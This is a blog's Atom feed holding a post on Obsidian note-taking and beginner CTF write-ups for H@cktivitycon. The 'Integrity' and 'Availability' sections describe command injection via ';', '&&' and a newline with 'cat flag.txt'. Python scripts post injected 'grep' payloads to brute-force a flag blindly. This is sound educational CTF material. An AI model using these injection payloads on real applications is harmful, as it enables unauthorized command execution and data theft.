<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.1">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-11-11T14:45:58-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">GlitchGecko</title><subtitle>Welcome to my website!</subtitle><author><name>GlitchGecko</name></author><entry><title type="html">Taking Notes With Obsidian</title><link href="http://localhost:4000/2022/05/06/Taking-Notes-With-Obsidian.html" rel="alternate" type="text/html" title="Taking Notes With Obsidian" /><published>2022-05-06T00:00:00-05:00</published><updated>2022-05-06T00:00:00-05:00</updated><id>http://localhost:4000/2022/05/06/Taking-Notes-With-Obsidian</id><content type="html" xml:base="http://localhost:4000/2022/05/06/Taking-Notes-With-Obsidian.html">&lt;p&gt;If done correctly, taking notes provides a deeper understanding in material while simultaneously giving a custom source that you can refer to whenever needed.&lt;/p&gt;

&lt;p&gt;I have to admit, I was never much a note-taker for most of my life. It seemed like an unnecessary chore to me, especially when I could just use Quizlet to cram for a test. After I started college, though, I realized just how important proper note-taking could be.&lt;/p&gt;

&lt;h1 id=&quot;obsidian&quot;&gt;Obsidian&lt;/h1&gt;

&lt;p&gt;I think the main reason notes didn’t work for me in the past was that I simply wasn’t taking effective notes. I had no formatting, nothing to make my notes easy to access, and none of it was organized.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://obsidian.md&quot;&gt;Obsidian&lt;/a&gt; is an extremely powerful tool designed to allow for fully customizable markdown note-taking with a large list of additional features, including:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;A graph view of your notes.&lt;/li&gt;
  &lt;li&gt;Backlinks from one note to another.&lt;/li&gt;
  &lt;li&gt;Markdown formatting.&lt;/li&gt;
  &lt;li&gt;Plugin support.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;how-obsidian-works&quot;&gt;How Obsidian Works&lt;/h2&gt;

&lt;p&gt;Obsidian stores notes locally in a folder referred to as a ‘vault’. This vault contains all plugins, notes, images, or anything else used in your notes.&lt;/p&gt;</content><author><name>GlitchGecko</name></author><summary type="html">If done correctly, taking notes provides a deeper understanding in material while simultaneously giving a custom source that you can refer to whenever needed.</summary></entry><entry><title type="html">H@cktivitycon CTF Writeups</title><link href="http://localhost:4000/2021/10/01/Hacktivitycon-CTF.html" rel="alternate" type="text/html" title="H@cktivitycon CTF Writeups" /><published>2021-10-01T00:00:00-05:00</published><updated>2021-10-01T00:00:00-05:00</updated><id>http://localhost:4000/2021/10/01/Hacktivitycon-CTF</id><content type="html" xml:base="http://localhost:4000/2021/10/01/Hacktivitycon-CTF.html">&lt;p&gt;Before now, I’ve had no experience in anything involving Cybersecurity, but when I heard about the CTF run by John Hammond, congon4tor, M_alpha, fumenoid, NightWolf, Blacknote, and CalebStewart, I figured it’d be a great learning experience for me.&lt;/p&gt;

&lt;p&gt;I spent several hours researching and learning, in hopes of building up my abilities before the CTF.&lt;/p&gt;

&lt;p&gt;When it came time to start, I felt like I’d be a little useless and not have much to bring to the team, but it turned out that I actually solved seven challenges (and enterd the flag for one a teammate solved), netting  me just over 1100 points.&lt;/p&gt;

&lt;p&gt;In this post, I’m going to be detailing my thought process and how I found each flag, based on the order I completed them in.&lt;/p&gt;

&lt;h2 id=&quot;tsunami&quot;&gt;Tsunami&lt;/h2&gt;
&lt;h4 id=&quot;description-woah-its-a-natural-disaster-but-something-doesnt-seem-so-natural-about-this-big-wave&quot;&gt;Description: “Woah! It’s a natural disaster! But something doesn’t seem so natural about this big wave…”&lt;/h4&gt;

&lt;p&gt;Nobody on my team seemed interested in trying this one, as it involved an audio file and none of us had headphones.
Checking the file type, I found that “tsunami” was a .wav file, so I renamed it accordingly.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Tsunami2.png&quot; alt=&quot;Tsunami 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I figured maybe there was something hidden in the visualization in the wave itself, so I tried opening it in sonic visualiser.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Tsunami3.png&quot; alt=&quot;Tsunami 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I couldn’t find anything right away, but I looked at the spectrogram view and zoomed in a little towards the end, and the flag was right there in plaintext!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Tsunami4.png&quot; alt=&quot;Tsunami 3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;bass-64&quot;&gt;Bass 64&lt;/h2&gt;
&lt;h4 id=&quot;description-it-uh-looks-like-someone-bass-boosted-this-can-you-make-any-sense-of-it&quot;&gt;Description: “It, uh… looks like someone bass-boosted this? Can you make any sense of it?”&lt;/h4&gt;

&lt;p&gt;Reading this file gave quite a weird result.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Bass642.png&quot; alt=&quot;Bass64 1&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I wonder what happens when I zoom out the terminal…&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Bass643.png&quot; alt=&quot;Bass64 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Based on the hint, I assumed this was encoded via base 64, and ran the string through a decoder, giving me the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Bass644.png&quot; alt=&quot;Bass64 3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;target-practice&quot;&gt;Target Practice&lt;/h2&gt;
&lt;h4 id=&quot;description-can-you-hit-a-moving-target&quot;&gt;Description: “Can you hit a moving target?”&lt;/h4&gt;

&lt;p&gt;This one was a gif that looked a little like a target with vibrating dots on the outside of the target.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/target_practice.gif&quot; alt=&quot;Target Practice&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I noticed that frame 16 looked a little odd compared to the rest, based on the top left corner sticking out, so I split apart the frames and extracted frame 16.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Target_Practice2.gif&quot; alt=&quot;Target Practice 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I wondered what I could do with the image, and realized it looked a little like a QR code. Upon searching for circular QR codes, I found out that the image was actually a Maxi code, and scanning it gave the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Target_Practice3.png&quot; alt=&quot;Target Practice 3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;butter-overflow&quot;&gt;Butter Overflow&lt;/h2&gt;
&lt;h4 id=&quot;description-can-you-overflow-this-right&quot;&gt;Description: “Can you overflow this right?”&lt;/h4&gt;

&lt;p&gt;This one was a little fun to me.
Connecting to the port, you’re asked a simple question: “How many bytes does it take to overflow this buffer?” Upon any answer, you’re immediately disconnected from the port.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Butter_Overflow3.png&quot; alt=&quot;Butter Overflow&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I assumed I needed to overflow the buffer, so I did what any sane person would do, and held the letter ‘a’ for a minute or so.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Butter_Overflow2.png&quot; alt=&quot;Butter Overflow 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Success!&lt;/p&gt;

&lt;h2 id=&quot;2ez&quot;&gt;2ez&lt;/h2&gt;
&lt;h4 id=&quot;description-these-warmups-are-just-too-easy-this-one-definitely-starts-that-way-at-least&quot;&gt;Description: “These warmups are just too easy! This one definitely starts that way, at least!”&lt;/h4&gt;

&lt;p&gt;For this challenge, you’re simply given a data file that cannot be opened.&lt;/p&gt;

&lt;p&gt;Opening this with the hex editor, we find that the file is a .jfif file that is missing the proper header.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/2ez2.png&quot; alt=&quot;2ez&quot; /&gt;&lt;/p&gt;

&lt;p&gt;After doing a little bit of research, I found that the proper header for a .jfif file is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;FF D8 FF E0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;I simply added this header to the image, allowing me to open it for the flag!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/2ez3.png&quot; alt=&quot;2ez2&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;integrity&quot;&gt;Integrity&lt;/h2&gt;
&lt;h4 id=&quot;description-my-school-was-trying-to-teach-people-about-the-cia-triad-so-they-made-all-these-dumb-example-applications-as-if-they-know-anything-about-information-security-supposedly-they-learned-their-lesson-and-tried-to-make-this-one-more-secure-can-you-prove-it-is-still-vulnerable&quot;&gt;Description: “My school was trying to teach people about the CIA triad so they made all these dumb example applications… as if they know anything about information security. Supposedly they learned their lesson and tried to make this one more secure. Can you prove it is still vulnerable?”&lt;/h4&gt;

&lt;p&gt;This challenge involved a web application to verify the SHA256 hash of any file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Integrity2.png&quot; alt=&quot;Integrity&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This one is basically a sequel to the challenge “Confidentiality,” which was solved by one of my teammates.&lt;/p&gt;

&lt;p&gt;Confidentiality involved just using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;;&lt;/code&gt; or &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;amp;&amp;amp;&lt;/code&gt; to add another command to read the flag, but in Integrity, almost all characters were filtered.&lt;/p&gt;

&lt;p&gt;My research brought me towards using burpsuite to injecting my own code into their application.
I wasn’t too confident in this solution, but I tried entering a new line with the command &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat flag.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Integrity3.png&quot; alt=&quot;Integrity 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Surprisingly enough, this worked perfectly!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Integrity4.png&quot; alt=&quot;Integrity 3&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;availability&quot;&gt;Availability&lt;/h2&gt;
&lt;h4 id=&quot;description-my-school-was-trying-to-teach-people-about-the-cia-triad-so-they-made-all-these-dumb-example-applications-as-if-they-know-anything-about-information-security-they-said-they-fixed-the-bug-from-the-last-app-but-they-also-said-they-knew-they-went-overboard-with-the-filtered-characters-so-they-loosened-things-up-a-bit-can-you-hack-it&quot;&gt;Description: “My school was trying to teach people about the CIA triad so they made all these dumb example applications… as if they know anything about information security. They said they fixed the bug from the last app, but they also said they knew they went overboard with the filtered characters, so they loosened things up a bit. Can you hack it?”&lt;/h4&gt;

&lt;p&gt;This one was honestly the most enjoyable out of all the challenges. It was basically the same thing as the Integrity, with a web application that pings a port and gives outputs the success of the ping.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Availability2.png&quot; alt=&quot;Availability&quot; /&gt;&lt;/p&gt;

&lt;p&gt;I tried the same thing I did with Intregrity, but instead of displaying the flag, it just gave me a successful ping.&lt;/p&gt;

&lt;p&gt;Experimenting a little bit, I changed the ip to something I knew would be unsuccessful and tried &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat flag.txt&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;This time, I received a failed ping.&lt;/p&gt;

&lt;p&gt;Knowing this, I figured it would be possible to use the requests module on python in order to use the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt; command to search for letters in the flag.&lt;/p&gt;

&lt;p&gt;Here was my quick script to build up a character dictionary of possible letters:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;character_dictionary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'abcdefghijklmnopqrstuvwxyz1234567890'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
    grep {letter} &quot;flag.txt&quot;
    &quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;character_dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://challenge.ctf.games:31862/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Success'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;character_dictionary&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;character_dictionary&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here was the output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Availability3.png&quot; alt=&quot;Availability 2&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Knowing the characters in the flag can now allow me to figure out exactly what the flag is, using a very similar script:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'abcdfgl124567890'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        grep {letter} &quot;flag.txt&quot;
        &quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://challenge.ctf.games:31862/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Success'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here was the output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Availability4.png&quot; alt=&quot;Availability 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that the flag ends with the sequence ‘bf60’&lt;/p&gt;

&lt;p&gt;Knowing this, I can use the exact same script, but looking for letters starting from the end and working backwords.&lt;/p&gt;

&lt;p&gt;Here was the script I used:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'bf60'&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'abcdfgl124567890'&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;characters&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&quot;
        grep {letter} &quot;flag.txt&quot;
        &quot;&quot;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;letter&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://challenge.ctf.games:31862/'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'host'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;payload&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;})&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'Success'&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;break&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;flag&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And here was the output:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Availability6.png&quot; alt=&quot;Availability 3&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And that was the correct flag!&lt;/p&gt;

&lt;h1 id=&quot;final-thoughts&quot;&gt;Final thoughts&lt;/h1&gt;

&lt;p&gt;Overall I had a blast and really enjoyed the CTF, and I’m glad I decided to try it out. Big thanks to Ryan (An00bRektn) for helping me out and introducing me to the CTF, and for giving me the idea to make my own writeups! Check out his write ups &lt;a href=&quot;https://an00brektn.github.io/&quot;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I’m definitely looking forward to the next one!&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/Glitch-Gecko/glitch-gecko.github.io/main/images/Hacktivity.png&quot; alt=&quot;Congrats!&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://glitch-gecko.github.io&quot;&gt;Back to Home Page&lt;/a&gt;&lt;/p&gt;</content><author><name>GlitchGecko</name></author><summary type="html">Before now, I’ve had no experience in anything involving Cybersecurity, but when I heard about the CTF run by John Hammond, congon4tor, M_alpha, fumenoid, NightWolf, Blacknote, and CalebStewart, I figured it’d be a great learning experience for me.</summary></entry></feed>